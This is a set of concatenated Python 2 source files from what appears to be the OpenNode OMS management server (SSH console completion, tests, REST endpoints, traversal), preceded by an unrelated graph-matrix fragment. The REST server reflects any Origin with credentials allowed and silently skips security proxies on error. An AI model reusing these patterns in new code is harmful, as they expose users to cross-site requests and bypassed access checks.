        pi = pi.reshape(pi.size,)
        if normalized:
            pi /= sum(pi)
        return pi


    def getLaplacianMatrix(self, includeSubPaths=True):
        """
        Returns the transposed Laplacian matrix corresponding to the higher-order network.

        @param includeSubpaths: Whether or not subpath statistics shall be included in the
            calculation of matrix weights
        """

        T = self.getTransitionMatrix(includeSubPaths)
        I = _sparse.identity(self.vcount())

        return I-T

from grokcore.component import baseclass, context
from zope.component import provideSubscriptionAdapter
import argparse

from opennode.oms.endpoint.ssh import cmd
from opennode.oms.endpoint.ssh.completion import Completer
from opennode.oms.endpoint.ssh.cmdline import GroupDictAction
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model import creatable_models
from opennode.oms.zodb import db


class CommandCompleter(Completer):
    """Completes a command."""

    context(cmd.NoCommand)

    def complete(self, token, parsed, parser):
        return [name for name in cmd.commands().keys() if name.startswith(token)]


class PathCompleter(Completer):
    """Completes a path name."""
    baseclass()

    @db.transact
    def complete(self, token, parsed, parser):

        if not self.consumed(parsed, parser):
            obj = self.context.current_obj                    
            if IContainer.providedBy(obj):                    
                return [name for name in obj.listnames() if name.startswith(token)]                    

        return []

    def consumed(self, parsed, parser):
        """Check whether we have already consumed all positional arguments."""

        maximum = 0
        actual = 0
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                # For every positional argument:
                if not action.option_strings:
                    # Count how many of them we have already.
                    values = getattr(parsed, action.dest, [])
                    if values == action.default:  # don't count default values
                        values = []
                    if not isinstance(values, list):
                        values = [values]
                    actual += len(values)

                    # And the maximum number of expected occurencies.
                    if isinstance(action.nargs, int):
                        maximum += action.nargs
                    if action.nargs == argparse.OPTIONAL:
                        maximum += 1
                    else:
                        maximum = float('inf')

        return actual >= maximum


class ArgSwitchCompleter(Completer):
    """Completes argument switches based on the argparse grammar exposed for a command"""
    baseclass()

    def complete(self, token, parsed, parser):
        if token.startswith("-"):
            parser = self.context.arg_parser(partial=True)

            options = [option
                       for action_group in parser._action_groups
                       for action in action_group._group_actions
                       for option in action.option_strings
                       if option.startswith(token) and not self.option_consumed(action, parsed)]
            return options
        else:
            return []

    def option_consumed(self, action, parsed):
        # "count" actions can be repeated
        if action.nargs > 0 or isinstance(action, argparse._CountAction):
            return False

        if isinstance(action, GroupDictAction):
            value = getattr(parsed, action.group, {}).get(action.dest, action.default)
        else:
            value = getattr(parsed, action.dest, action.default)

        return value != action.default

class KeywordSwitchCompleter(ArgSwitchCompleter):
    """Completes key=value argument switches based on the argparse grammar exposed for a command.
    TODO: probably more can be shared with ArgSwitchCompleter."""

    baseclass()

    def complete(self, token, parsed, parser):
        options = [option[1:] + '='
                   for action_group in parser._action_groups
                   for action in action_group._group_actions
                   for option in action.option_strings
                   if option.startswith('=' + token) and not self.option_consumed(action, parsed)]
        return options


class KeywordValueCompleter(ArgSwitchCompleter):
    """Completes the `value` part of key=value constructs based on the type of the keyword.
    Currently works only for args which declare an explicit enumeration."""

    baseclass()

    def complete(self, token, parsed, parser):
        if '=' in token:
            keyword, value_prefix = token.split('=')

            action = self.find_action(keyword, parsed, parser)
            if action.choices:
                return [keyword + '=' + value for value in action.choices if value.startswith(value_prefix)]

        return []

    def find_action(self, keyword, parsed, parser):
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                if action.dest == keyword:
                    return action


class ObjectTypeCompleter(Completer):
    """Completes object type names."""

    context(cmd.cmd_mk)

    def complete(self, token):
        return [name for name in creatable_models.keys() if name.startswith(token)]


# TODO: move to handler
for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set]:
    provideSubscriptionAdapter(PathCompleter, adapts=[command])

for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set, cmd.cmd_quit]:
    provideSubscriptionAdapter(ArgSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordValueCompleter, adapts=[command])

import os

from columnize import columnize
from twisted.internet import defer

from opennode.oms.endpoint.ssh import cmd, completion, cmdline
from opennode.oms.endpoint.ssh.terminal import InteractiveTerminal
from opennode.oms.endpoint.ssh.tokenizer import CommandLineTokenizer, CommandLineSyntaxError
from opennode.oms.zodb import db


class OmsSshProtocol(InteractiveTerminal):
    """The OMS virtual console over SSH.

    Accepts lines of input and writes them back to its connection.  If
    a line consisting solely of "quit" is received, the connection
    is dropped.

    """

    def __init__(self):
        super(OmsSshProtocol, self).__init__()
        self.path = ['']

        @defer.inlineCallbacks
        def _get_obj_path():
            # Here, we simply hope that self.obj_path won't actually be
            # used until it's initialised.  A more fool-proof solution
            # would be to block everything in the protocol while the ZODB
            # query is processing, but that would require a more complex
            # workaround.  This will not be a problem during testing as
            # DB access is blocking when testing.
            self.obj_path = yield db.transact(lambda: [db.ref(db.get_root()['oms_root'])])()

        _get_obj_path()

        self.tokenizer = CommandLineTokenizer()

    def lineReceived(self, line):
        line = line.strip()

        try:
            command, cmd_args = self.parse_line(line)
        except CommandLineSyntaxError as e:
            self.terminal.write("Syntax error: %s\n" % (e.message))
            self.print_prompt()
            return

        deferred = defer.maybeDeferred(command, *cmd_args)

        @deferred
        def on_success(ret):
            self.print_prompt()

        @deferred
        def on_error(f):
            if not f.check(cmdline.ArgumentParsingError):
                f.raiseException()
            self.print_prompt()

        ret = defer.Deferred()
        deferred.addBoth(ret.callback)
        return ret

    def print_prompt(self):
        self.terminal.write(self.ps[self.pn])

    def insert_buffer(self, buf):
        """Inserts some chars in the buffer at the current cursor position."""
        lead, rest = self.lineBuffer[0:self.lineBufferIndex], self.lineBuffer[self.lineBufferIndex:]
        self.lineBuffer = lead + buf + rest
        self.lineBufferIndex += len(buf)

    def insert_text(self, text):
        """Inserts some text at the current cursor position and renders it."""
        self.terminal.write(text)
        self.insert_buffer(list(text))

    def parse_line(self, line):
        """Returns a command instance and parsed cmdline argument list.

        TODO: Shell expansion should be handled here.

        """

        cmd_name, cmd_args = line.partition(' ')[::2]
        command_cls = cmd.get_command(cmd_name)

        tokenized_cmd_args = self.tokenizer.tokenize(cmd_args.strip())

        return command_cls(self), tokenized_cmd_args

    @defer.inlineCallbacks
    def handle_TAB(self):
        """Handles tab completion."""
        partial, rest, completions = yield completion.complete(self, self.lineBuffer, self.lineBufferIndex)

        if len(completions) == 1:
            space = '' if rest else ' '                    
            # handle quote closing
            if self.lineBuffer[self.lineBufferIndex - len(partial) - 1] == '"':
                space = '" '
            # Avoid space after '=' just for aestetics.
            if completions[0].endswith('='):                    
                space = ''                    

            patch = completions[0][len(partial):] + space
            self.insert_text(patch)
        elif len(completions) > 1:
            common_prefix = os.path.commonprefix(completions)
            patch = common_prefix[len(partial):]
            self.insert_text(patch)

            # postpone showing list of possible completions until next tab
            if not patch:
                self.terminal.nextLine()
                self.terminal.write(columnize(completions))
                self.drawInputLine()
                if len(rest):
                    self.terminal.cursorBackward(len(rest))


    @property
    def hist_file_name(self):
        return os.path.expanduser('~/.oms_history')

    @property
    def ps(self):
        ps1 = '%s@%s:%s%s ' % ('user', 'oms', self._cwd(), '#')
        return [ps1, '... ']

    def _cwd(self):
        return self.make_path(self.path)

    @staticmethod
    def make_path(path):
        return '/'.join(path) or '/'

import unittest

import mock
from nose.tools import eq_

from opennode.oms.endpoint.ssh.protocol import OmsSshProtocol
from opennode.oms.endpoint.ssh import cmd


class CmdCompletionTestCase(unittest.TestCase):

    def setUp(self):
        self.oms_ssh = OmsSshProtocol()
        self.terminal = mock.Mock()
        self.oms_ssh.terminal = self.terminal

        self.oms_ssh.connectionMade()

        # the standard model doesn't have any command or path which
        # is a prefix of another (len > 1), I don't want to force changes
        # to the model just for testing completion, so we have monkey patch
        # the commands() function and add a command 'hello'.
        self.orig_commands = cmd.commands
        cmd.commands = lambda: dict(hello=cmd.Cmd, **self.orig_commands())

    def tearDown(self):
        cmd.commands = self.orig_commands

    def _input(self, string):
        for s in string:
            self.oms_ssh.characterReceived(s, False)

    def _tab_after(self, string):
        self._input(string)
        self.terminal.reset_mock()

        self.oms_ssh.handle_TAB()

    def test_command_completion(self):
        self._tab_after('s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_command_completion_spaces(self):
        self._tab_after('    s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_complete_not_found(self):
        self._tab_after('t')
        eq_(len(self.terminal.method_calls), 0)

    def test_complete_quotes(self):
        self._tab_after('ls "comp')
        eq_(self.terminal.method_calls, [('write', ('utes" ',), {})])                    

    def test_complete_prefix(self):
        self._tab_after('h')
        eq_(self.terminal.method_calls, [('write', ('el',), {})])

        # hit tab twice
        self.terminal.reset_mock()
        self.oms_ssh.handle_TAB()

        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('help  hello\n',), {}), ('write', (self.oms_ssh.ps[0] + 'hel',), {})])

    def test_spaces_between_arg(self):
        self._tab_after('ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])                    

    def test_command_arg_spaces_before_command(self):
        self._tab_after(' ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])                    

    def test_mandatory_positional(self):
        self._tab_after('cat ')
        eq_(len(self.terminal.method_calls), 4)

    def test_complete_switches(self):
        self._tab_after('quit ')
        eq_(len(self.terminal.method_calls), 0)

        # hit tab twice
        self.oms_ssh.handle_TAB()
        eq_(len(self.terminal.method_calls), 0)

        # now try with a dash
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('-h  --help\n',), {}), ('write', (self.oms_ssh.ps[0] + 'quit -',), {})])
        # disambiguate
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('help ',), {})])

    def test_complete_consumed_switches(self):
        self._tab_after('ls --help')
        eq_(self.terminal.method_calls, [('write', (' ',), {})])

        self._tab_after('-')
        assert 'help' not in self.terminal.method_calls[2][1][0]
        assert '-h' not in self.terminal.method_calls[2][1][0]

from grokcore.component import Adapter, implements, baseclass
from grokcore.security import require
from zope.interface import Interface


class IHttpRestView(Interface):
    def render(request):
        pass

    def render_recursive(request, depth):
        pass

    def rw_transaction(request):
        """Return true if we this request should be committed"""


class IHttpRestSubViewFactory(Interface):
    def resolve(path):                    
        """Resolve a view for a given sub path"""


class HttpRestView(Adapter):
    implements(IHttpRestView)
    baseclass()
    require('rest')

    __builtin_attributes__ = ['id', 'children']

    def filter_attributes(self, request, data):
        """Handle the filtering of attributes according to the 'attrs' parameter in the request"""
        attrs = request.args.get('attrs', [''])[0]
        if attrs:
            filtered_data = {}
            for a in attrs.decode('utf-8').split(',') + self.__builtin_attributes__:
                if a in data:
                    filtered_data[a] = data[a]
            return filtered_data
        return data

    def render_recursive(self, request, depth):
        for method in ('render_' + request.method, 'render'):
            if hasattr(self, method):
                return self.filter_attributes(request, getattr(self, method)(request))
        raise NotImplemented("method %s not implemented\n" % request.method)

    def render_OPTIONS(self, request):
        all_methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD']
        has_methods = [m for m in all_methods if hasattr(self, 'render_%s' % m)] + ['OPTIONS']
        request.setHeader('Allow', ', '.join(has_methods))

        from opennode.oms.endpoint.httprest.root import EmptyResponse
        return EmptyResponse

    def rw_transaction(self, request):
        return request.method != 'GET'

import json
import functools
import zope.security.interfaces

from twisted.internet import defer
from twisted.python import log, failure
from twisted.web import resource
from twisted.web.server import NOT_DONE_YET
from zope.component import queryAdapter, getUtility

from opennode.oms.config import get_config
from opennode.oms.endpoint.httprest.base import IHttpRestView, IHttpRestSubViewFactory
from opennode.oms.model.traversal import traverse_path
from opennode.oms.security.checker import proxy_factory
from opennode.oms.security.interaction import new_interaction
from opennode.oms.util import blocking_yield
from opennode.oms.zodb import db


class EmptyResponse(Exception):
    pass


class HttpStatus(Exception):
    def __init__(self, body=None, *args, **kwargs):
        super(HttpStatus, self).__init__(*args, **kwargs)
        self.body = body

    @property
    def status_code(self):
        raise NotImplementedError

    @property
    def status_description(self):
        raise NotImplementedError

    headers = {}


class NotFound(HttpStatus):
    status_code = 404
    status_description = "Not Found"


class NotImplemented(HttpStatus):
    status_code = 501
    status_description = "Not Implemented"


class AbstractRedirect(HttpStatus):
    def __init__(self, url, *args, **kwargs):
        super(AbstractRedirect, self).__init__(*args, **kwargs)
        self.url = url

    @property
    def headers(self):
        return {'Location': self.url}


class SeeCanonical(AbstractRedirect):
    status_code = 301
    status_description = "Moved Permanently"


class SeeOther(AbstractRedirect):
    status_code = 303
    status_description = "Moved Temporarily"


class Unauthorized(HttpStatus):
    status_code = 401
    status_description = "Authorization Required"

    headers = {'WWW-Authenticate': 'Basic realm=OMS',
               'Set-Cookie': 'oms_auth_token=;expires=Wed, 01 Jan 2000 00:00:00 GMT'}


class Forbidden(HttpStatus):
    status_code = 403
    status_description = "Forbidden"


class BadRequest(HttpStatus):
    status_code = 400
    status_description = "Bad Request"


def log_wrapper(self, f, server):
    @functools.wraps(f)
    def log_(request):
        """
        Log a request's result to the logfile, by default in combined log format.
        """
        if hasattr(request, 'interaction'):
            principals = map(lambda pp: pp.principal.id, request.interaction.participations)
        else:                    
            principals = []
        if hasattr(self, "logFile"):
            line = '%s %s - %s "%s" %d %s "%s" "%s"\n' % (
                request.getClientIP(),
                principals,
                self._logDateTime,
                '%s %s %s' % (self._escape(request.method),
                              self._escape(request.uri),
                              self._escape(request.clientproto)),
                request.code,
                request.sentLength or "-",
                self._escape(request.getHeader("referer") or "-"),
                self._escape(request.getHeader("user-agent") or "-"))
            self.logFile.write(line)
    return log_


class HttpRestServer(resource.Resource):
    """Restful HTTP API interface for OMS.

    Exposes a JSON web service to communicate with OMS.

    """

    def getChild(self, name, request):
        """We are the handler for anything below this base url, except what explicitly added in oms.tac."""
        return self

    def __init__(self, avatar=None):
        ## Twisted Resource is a not a new style class, so emulating a super-call
        resource.Resource.__init__(self)
        self.avatar = avatar

        self.use_security_proxy = get_config().getboolean('auth', 'security_proxy_rest')

    def render(self, request):
        request.site.log = log_wrapper(request.site, request.site.log, self)
        deferred = self._render(request)

        @deferred
        def on_error(error):
            log.msg("Error while rendering http %s", system='httprest')
            log.err(error, system='httprest')

        return NOT_DONE_YET

    @defer.inlineCallbacks
    def _render(self, request):
        request.setHeader('Content-type', 'application/json')
        origin = request.getHeader('Origin')
        if origin:
            request.setHeader('Access-Control-Allow-Origin', origin)
            request.setHeader('Access-Control-Allow-Credentials', 'true')
        else:                    
            request.setHeader('Access-Control-Allow-Origin', '*')
        request.setHeader('Access-Control-Allow-Methods', 'GET, PUT, POST, DELETE, OPTIONS, HEAD')
        request.setHeader('Access-Control-Allow-Headers',
                          'Origin, Content-Type, Cache-Control, X-Requested-With')

        ret = None
        try:
            ret = yield self.handle_request(request)
            if ret is EmptyResponse:
                raise ret
        except EmptyResponse:
            pass
        except HttpStatus as exc:
            request.setResponseCode(exc.status_code, exc.status_description)
            for name, value in exc.headers.items():
                request.responseHeaders.addRawHeader(name, value)
            if exc.body:
                request.write(json.dumps(exc.body))
            else:                    
                request.write("%s %s\n" % (exc.status_code, exc.status_description))
            if exc.message:
                request.write("%s\n" % exc.message)
        except Exception:
            request.setResponseCode(500, "Server Error")
            request.write("%s %s\n\n" % (500, "Server Error"))
            log.err(system='httprest')
            failure.Failure().printTraceback(request)
        else:                    
            # allow views to take full control of output streaming
            if ret != NOT_DONE_YET:
                def render(obj):
                    if isinstance(obj, set):
                        return list(obj)  # safeguard against dumping sets
                    if hasattr(obj, '__str__'):
                        return str(obj)
                    log.msg("RENDERING ERROR, cannot json serialize %s" % obj, system='httprest')
                    raise TypeError

                request.write(json.dumps(ret, indent=2, default=render) + '\n')
        finally:
            if ret != NOT_DONE_YET:
                request.finish()

    def check_auth(self, request):
        from opennode.oms.endpoint.httprest.auth import IHttpRestAuthenticationUtility

        authentication_utility = getUtility(IHttpRestAuthenticationUtility)
        credentials = authentication_utility.get_basic_auth_credentials(request)
        if credentials:
            blocking_yield(authentication_utility.authenticate(request, credentials, basic_auth=True))
            return authentication_utility.generate_token(credentials)
        else:                    
            return authentication_utility.get_token(request)

    def find_view(self, obj, unresolved_path):                    

        sub_view_factory = queryAdapter(obj, IHttpRestSubViewFactory)                    
        if sub_view_factory:                    
            view = sub_view_factory.resolve(unresolved_path)                    
        else:                    
            view = queryAdapter(obj, IHttpRestView)                    

        if not view:                    
            raise NotFound

        return view                    

    @db.transact
    def handle_request(self, request):
        """Takes a request, maps it to a domain object and a
        corresponding IHttpRestView, and returns the rendered output
        of that view.

        """
        token = self.check_auth(request)

        oms_root = db.get_root()['oms_root']
        objs, unresolved_path = traverse_path(oms_root, request.path[1:])

        if not objs and unresolved_path:
            objs = [oms_root]

        obj = objs[-1]

        interaction = self.get_interaction(request, token)
        request.interaction = interaction

        if self.use_security_proxy:
            obj = proxy_factory(obj, interaction)

        view = self.find_view(obj, unresolved_path)                    
        needs_rw_transaction = view.rw_transaction(request)

        # create a security proxy if we have a secured interaction
        if interaction:
            try:
                view = proxy_factory(view, interaction)
            except:
                # XXX: TODO: define a real exception for this proxy creation error
                # right now we want to ignore security when there are no declared rules
                # on how to secure a view
                pass

        def get_renderer(view, method):
            try:
                return getattr(view, method, None)
            except zope.security.interfaces.Unauthorized:
                from opennode.oms.endpoint.httprest.auth import IHttpRestAuthenticationUtility

                if token or not getUtility(IHttpRestAuthenticationUtility).get_basic_auth_credentials(request):                    
                    raise Forbidden('User does not have permission to access this resource')
                raise Unauthorized()

        for method in ('render_' + request.method, 'render'):
            # hasattr will return false on unauthorized fields
            renderer = get_renderer(view, method)
            if renderer:
                res = renderer(request)

                if needs_rw_transaction:
                    return res
                else:                    
                    return db.RollbackValue(res)

        raise NotImplementedError("method %s not implemented\n" % request.method)

    def get_interaction(self, request, token):
        # TODO: we can quickly disable rest auth
        # if get_config().getboolean('auth', 'enable_anonymous'):
        #     return None

        from opennode.oms.endpoint.httprest.auth import IHttpRestAuthenticationUtility

        authentication_utility = getUtility(IHttpRestAuthenticationUtility)
        try:
            principal = authentication_utility.get_principal(token)
        except:
            # Avoid that changes in format of security token will require every user
            # to flush the cookies
            principal = 'oms.anonymous'

        if principal != 'oms.anonymous':
            authentication_utility.renew_token(request, token)

        if request.method == 'OPTIONS':
            principal = 'oms.rest_options'

        return new_interaction(principal)

import json
import os
import time
import Queue

from grokcore.component import context
from hashlib import sha1
from twisted.web.server import NOT_DONE_YET
from twisted.python import log
from twisted.internet import reactor, threads, defer
from zope.component import queryAdapter, handle
from zope.security.interfaces import Unauthorized
from zope.security.proxy import removeSecurityProxy

from opennode.oms.endpoint.httprest.base import HttpRestView, IHttpRestView
from opennode.oms.endpoint.httprest.root import BadRequest, NotFound
from opennode.oms.endpoint.ssh.cmd.security import effective_perms
from opennode.oms.endpoint.ssh.detached import DetachedProtocol
from opennode.oms.endpoint.ssh.cmdline import ArgumentParsingError
from opennode.oms.model.form import RawDataApplier
from opennode.oms.model.location import ILocation
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model.bin import ICommand
from opennode.oms.model.model.byname import ByNameContainer
from opennode.oms.model.model.events import ModelDeletedEvent
from opennode.oms.model.model.filtrable import IFiltrable
from opennode.oms.model.model.search import SearchContainer, SearchResult
from opennode.oms.model.model.stream import IStream, StreamSubscriber
from opennode.oms.model.model.symlink import Symlink, follow_symlinks
from opennode.oms.model.schema import model_to_dict
from opennode.oms.model.traversal import traverse_path
from opennode.oms.security.checker import get_interaction
from opennode.oms.zodb import db


class DefaultView(HttpRestView):
    context(object)

    def render_GET(self, request):
        if not request.interaction.checkPermission('view', self.context):
            raise NotFound()                    

        data = model_to_dict(self.context)

        data['id'] = self.context.__name__
        data['__type__'] = type(removeSecurityProxy(self.context)).__name__
        try:
            data['url'] = ILocation(self.context).get_url()
        except Unauthorized:
            data['url'] = ''

        interaction = get_interaction(self.context)
        data['permissions'] = effective_perms(interaction, self.context) if interaction else []

        # XXX: simplejson can't serialize sets
        if 'tags' in data:
            data['tags'] = list(data['tags'])

        return data

    def render_PUT(self, request):
        data = json.load(request.content)
        if 'id' in data:
            del data['id']

        data = self.put_filter_attributes(request, data)

        form = RawDataApplier(data, self.context)
        if not form.errors:
            form.apply()
            return [IHttpRestView(self.context).render_recursive(request, depth=0)]
        else:
            request.setResponseCode(BadRequest.status_code)
            return form.error_dict()

    def put_filter_attributes(self, request, data):
        """Offer the possibility to subclasses to massage the received json before default behavior."""                    
        return data

    def render_DELETE(self, request):
        force = request.args.get('force', ['false'])[0] == 'true'

        parent = self.context.__parent__
        del parent[self.context.__name__]

        try:
            handle(self.context, ModelDeletedEvent(parent))
        except Exception as e:
            if not force:
                raise e
            return {'status': 'failure'}

        return {'status': 'success'}


class ContainerView(DefaultView):
    context(IContainer)

    def render_GET(self, request):
        depth = request.args.get('depth', ['0'])[0]
        try:
            depth = int(depth)
        except ValueError:
            depth = 0

        return self.render_recursive(request, depth, top_level=True)

    def render_recursive(self, request, depth, filter_=[], top_level=False):
        container_properties = super(ContainerView, self).render_GET(request)

        if depth < 1:
            return self.filter_attributes(request, container_properties)

        exclude = [excluded.strip() for excluded in request.args.get('exclude', [''])[0].split(',')]

        def preconditions(obj):
            yield request.interaction.checkPermission('view', obj)
            yield obj.__name__ not in exclude
            yield obj.target.__parent__ == obj.__parent__ if type(obj) is Symlink else True

        items = map(follow_symlinks, filter(lambda obj: all(preconditions(obj)), self.context.listcontent()))

        def secure_render_recursive(item):
            try:
                return IHttpRestView(item).render_recursive(request, depth - 1)
            except Unauthorized:
                permissions = effective_perms(get_interaction(item), item)
                if 'view' in permissions:
                    return dict(access='denied', permissions=permissions,
                                __type__=type(removeSecurityProxy(item)).__name__)

        qlist = []
        limit = None
        offset = 0

        if top_level:
            qlist = request.args.get('q', [])
            qlist = map(lambda q: q.decode('utf-8'), qlist)
            limit = int(request.args.get('limit', [0])[0])
            offset = int(request.args.get('offset', [1])[0]) - 1
            if offset <= 0:
                offset = 0

        def secure_filter_match(item, q):
            try:
                return IFiltrable(item).match(q)
            except Unauthorized:
                return

        for q in qlist:
            items = filter(lambda item: secure_filter_match(item, q), items)

        children = filter(None, [secure_render_recursive(item) for item in items
                                 if queryAdapter(item, IHttpRestView) and not self.blacklisted(item)])

        total_children = len(children)

        if (limit is not None and limit != 0) or offset:
            children = children[offset : offset + limit]

        # backward compatibility:
        # top level results for pure containers are plain lists
        if top_level and (not container_properties or len(container_properties.keys()) == 1):
            return children

        if not top_level or depth > 0:
            container_properties['children'] = children
            container_properties['totalChildren'] = total_children

        return self.filter_attributes(request, container_properties)

    def blacklisted(self, item):
        return isinstance(item, ByNameContainer)


class SearchView(ContainerView):
    context(SearchContainer)

    def render_GET(self, request):
        q = request.args.get('q', [''])[0]

        if not q:
            return super(SearchView, self).render_GET(request)

        search = db.get_root()['oms_root']['search']
        res = SearchResult(search, q.decode('utf-8'))

        return IHttpRestView(res).render_GET(request)


class StreamView(HttpRestView):
    context(StreamSubscriber)

    cached_subscriptions = dict()

    def rw_transaction(self, request):
        return False

    def render(self, request):
        timestamp = int(time.time() * 1000)
        oms_root = db.get_root()['oms_root']

        limit = int(request.args.get('limit', ['100'])[0])
        after = int(request.args.get('after', ['0'])[0])

        subscription_hash = request.args.get('subscription_hash', [''])[0]
        if subscription_hash:
            if subscription_hash in self.cached_subscriptions:
                data = self.cached_subscriptions[subscription_hash]
            else:
                raise BadRequest("Unknown subscription hash")
        elif not request.content.getvalue():
            return {}
        else:
            data = json.load(request.content)
            subscription_hash = sha1(request.content.getvalue()).hexdigest()
            self.cached_subscriptions[subscription_hash] = data
            request.responseHeaders.addRawHeader('X-OMS-Subscription-Hash', subscription_hash)

        def val(r):
            objs, unresolved_path = traverse_path(oms_root, r)
            if unresolved_path:
                return [(timestamp, dict(event='delete', name=os.path.basename(r), url=r))]
            return IStream(objs[-1]).events(after, limit=limit)

        # ONC wants it in ascending time order
        # while internally we prefer to keep it newest first to
        # speed up filtering.
        # Reversed is not json serializable so we have to reify to list.
        res = [list(reversed(val(resource))) for resource in data]
        res = [(i, v) for i, v in enumerate(res) if v]
        return [timestamp, dict(res)]


class CommandView(DefaultView):
    context(ICommand)

    def write_results(self, request, pid, cmd):
        log.msg('Called %s got result: pid(%s) term writes=%s' % (
                cmd, pid, len(cmd.write_buffer)), system='command-view')
        request.write(json.dumps({'status': 'ok', 'pid': pid,
                                  'stdout': cmd.write_buffer}))
        request.finish()

    def render_PUT(self, request):
        """ Converts arguments into command-line counterparts and executes the omsh command.

        Parameters passed as 'arg' are converted into positional arguments, others are converted into
        named parameters:

            PUT /bin/ls?arg=/some/path&arg=/another/path&-l&--recursive

        thus translates to:

            /bin/ls /some/path /another/path -l --recursive

        Allows blocking (synchronous) and non-blocking operation using the 'asynchronous' parameter (any
        value will trigger it). Synchronous operation requires two threads to function.
        """

        def named_args_filter_and_flatten(nargs):
            for name, vallist in nargs:
                if name not in ('arg', 'asynchronous'):
                    for val in vallist:
                        yield name
                        yield val

        def convert_args(args):
            tokenized_args = args.get('arg', [])
            return tokenized_args + list(named_args_filter_and_flatten(args.items()))

        protocol = DetachedProtocol()
        protocol.interaction = get_interaction(self.context) or request.interaction

        args = convert_args(request.args)
        args = filter(None, args)
        cmd = self.context.cmd(protocol)
        # Setting write_buffer to a list makes command save the output to the buffer too
        cmd.write_buffer = []
        d0 = defer.Deferred()

        try:
            pid = threads.blockingCallFromThread(reactor, cmd.register, d0, args,
                                                 '%s %s' % (request.path, args))
        except ArgumentParsingError, e:
            raise BadRequest(str(e))

        q = Queue.Queue()

        def execute(cmd, args):
            d = defer.maybeDeferred(cmd, *args)
            d.addBoth(q.put)
            d.chainDeferred(d0)

        dt = threads.deferToThread(execute, cmd, args)

        if request.args.get('asynchronous', []):
            reactor.callFromThread(self.write_results, request, pid, cmd)
        else:
            dt.addBoth(lambda r: threads.deferToThread(q.get, True, 60))
            dt.addCallback(lambda r: reactor.callFromThread(self.write_results, request, pid, cmd))

            def errhandler(e, pid, cmd):
                e.trap(ArgumentParsingError)
                raise BadRequest(str(e))
            dt.addErrback(errhandler, pid, cmd)
        return NOT_DONE_YET

import logging
import re

from grokcore.component import Adapter, implements, baseclass
from zope.interface import Interface

from opennode.oms.model.model.symlink import follow_symlinks


__all__ = ['traverse_path', 'traverse1']


log = logging.getLogger(__name__)


class ITraverser(Interface):
    """Adapters providing object traversal should implement this interface."""

    def traverse(name):
        """Takes the name of the object to traverse to and returns the traversed object, if any."""


class Traverser(Adapter):
    """Base class for all object traversers."""
    implements(ITraverser)
    baseclass()


def traverse_path(obj, path):
    """Starting from the given object, traverses all its descendant
    objects to find an object that matches the given path.

    Returns a tuple that contains the object up to which the traversal
    was successful plus all objects that led to that object, and the
    part of the path that could not be resolved.

    """

    if not path or path == '/':                    
        return [obj], []

    path = re.sub(r'\/+', '/', path)                    
    if path.endswith('/'):                    
        path = path[:-1]                    
    if path.startswith('/'):                    
        path = path[1:]                    

    path = path.split('/')                    

    ret = [obj]
    while path:
        name = path[0]
        try:
            traverser = ITraverser(ret[-1])
        except TypeError:
            break

        next_obj = follow_symlinks(traverser.traverse(name))

        if not next_obj:
            break

        ret.append(next_obj)
        path = path[1:]                    

    return ret[1:], path


def traverse1(path):
    """Provides a shortcut for absolute path traversals without
    needing to pass in the root object.

    """

    # Do it here just in case; to avoid circular imports:
    from opennode.oms.zodb import db

    oms_root = db.get_root()['oms_root']
    objs, untraversed_path = traverse_path(oms_root, path)
    if objs and not untraversed_path:
        return objs[-1]
    else:
        return None


def canonical_path(item):
    path = []
    from opennode.oms.security.authentication import Sudo
    while item:
        with Sudo(item):
            assert item.__name__ is not None, '%s.__name__ is None' % item
            item = follow_symlinks(item)
            path.insert(0, item.__name__)
            item = item.__parent__
    return '/'.join(path)

import functools
import inspect
import time
import threading

from Queue import Queue, Empty

import zope.interface
from zope.component import getSiteManager, implementedBy
from zope.interface import classImplements
from twisted.internet import defer, reactor
from twisted.python import log
from twisted.python.failure import Failure

from opennode.oms.config import get_config


def get_direct_interfaces(obj):
    """Returns the interfaces that the parent class of `obj`
    implements, exluding any that any of its ancestor classes
    implement.

    >>> from zope.interface import Interface, implements, implementedBy
    >>> class IA(Interface): pass
    >>> class IB(Interface): pass
    >>> class A: implements(IA)
    >>> class B(A): implements(IB)
    >>> b = B()
    >>> [i.__name__ for i in list(implementedBy(B).interfaces())]
    ['IB', 'IA']
    >>> [i.__name__ for i in get_direct_interfaces(b)]
    ['IB']

    """
    cls = obj if isinstance(obj, type) else type(obj)

    if not isinstance(obj, type) and hasattr(obj, 'implemented_interfaces'):
        interfaces = obj.implemented_interfaces()
    else:
        interfaces = list(zope.interface.implementedBy(cls).interfaces())

    for base_cls in cls.__bases__:
        for interface in list(zope.interface.implementedBy(base_cls).interfaces()):
            # in multiple inheritance this it could be already removed
            if interface in interfaces:
                interfaces.remove(interface)

    return interfaces


def get_direct_interface(obj):
    interfaces = get_direct_interfaces(obj)
    if not interfaces:
        return None
    if len(interfaces) == 1:
        return interfaces[0]
    else:
        raise Exception("Object implements more than 1 interface")


def query_adapter_for_class(cls, interface):
    return getSiteManager().adapters.lookup([implementedBy(cls)], interface)


class Singleton(type):
    """Singleton metaclass."""

    def __init__(cls, name, bases, dict):
        super(Singleton, cls).__init__(name, bases, dict)
        cls.instance = None

    def __call__(cls, *args, **kw):
        if cls.instance is None:
            cls.instance = super(Singleton, cls).__call__(*args, **kw)
        return cls.instance


def subscription_factory(cls, *args, **kwargs):
    """Utility which allows to to quickly register a subscription adapters which returns new instantiated objects                    
    of a given class                    

    >>> provideSubscriptionAdapter(subscription_factory(MetricsDaemonProcess), adapts=(IProc,))

    """

